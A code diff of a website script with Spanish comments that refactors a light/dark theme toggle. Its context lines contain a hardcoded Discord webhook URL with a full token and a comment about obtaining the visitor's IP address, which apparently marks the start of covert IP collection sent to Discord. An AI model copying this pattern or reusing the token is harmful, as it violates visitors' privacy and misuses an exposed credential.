@@ -10,25 +10,39 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- Cambio de tema ---
     const themeToggle = document.getElementById('theme-toggle');
+    const root = document.documentElement; // Accede a :root para manipular variables CSS
 
-    // Cargar el tema guardado
+    // Aplicar el tema guardado
     if (localStorage.getItem('theme') === 'dark') {
-        document.body.classList.add('dark-mode');
+        setDarkMode();
     } else {
-        document.body.classList.add('light-mode');
+        setLightMode();
     }
 
-    // Alternar el tema
+    // Alternar entre Light/Dark Mode
     themeToggle.addEventListener('click', () => {
-        if (document.body.classList.contains('light-mode')) {
-            document.body.classList.replace('light-mode', 'dark-mode');
-            localStorage.setItem('theme', 'dark');
+        if (root.classList.contains('light-mode')) {
+            setDarkMode();
         } else {
-            document.body.classList.replace('dark-mode', 'light-mode');
-            localStorage.setItem('theme', 'light');
+            setLightMode();
         }
     });
 
+    // --- Función: Activar Dark Mode ---
+    function setDarkMode() {
+        root.classList.add('dark-mode');
+        root.classList.remove('light-mode');
+        localStorage.setItem('theme', 'dark');
+    }
+
+    // --- Función: Activar Light Mode ---
+    function setLightMode() {
+        root.classList.add('light-mode');
+        root.classList.remove('dark-mode');
+        localStorage.setItem('theme', 'light');
+    }
+
+    // --- Webhook de Discord ---
     const webhookURL = 'https://discord.com/api/webhooks/1316790882808107101/CVjQeNxDisODGhjMq9AjWin0XcV_xKWOL1VX76Ynog-7sciWT-ZwTCf-84RFm56HS_IH';
 
     // --- Obtener la IP del usuario ---
